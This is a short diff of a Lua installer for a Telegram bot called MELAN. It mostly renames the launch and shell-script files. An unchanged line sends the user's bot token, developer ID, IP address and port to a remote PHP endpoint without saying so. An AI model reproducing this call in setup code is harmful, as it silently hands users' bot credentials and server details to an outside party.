@@ -46,7 +46,7 @@ end
 else 
 print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nلم يتم حفظ توكن البوت ارسله مره اخرى\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
 end  
-os.execute('lua MELAN8.lua8.lua') 
+os.execute('lua MELAN8.lua') 
 end
 local Create = function(data, file, uglify)  
 file = io.open(file, "w+")   
@@ -68,7 +68,7 @@ SudoIds = {DevRio:get(Server.."IdMELAN8.lua")},
 }
 Create(Config, "./config.lua") 
 https.request("https:///Api/MELAN/index.php?Get=MELAN&DevId="..DevRio:get(Server.."IdMELAN").."&TokenBot="..DevRio:get(Server.."TokenMELAN").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
-file = io.open("MELAN8.sh", "w")  
+file = io.open("MELAN.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
 cd $HOME/MELAN
@@ -98,7 +98,7 @@ cd $HOME/MELAN
 while(true) do
 rm -fr ../.telegram-cli
 screen -S MELAN -X kill
-screen -S MELAN ./MELAN8.sh
+screen -S MELAN ./MELAN.sh
 done
 ]]) 
 file:close() 
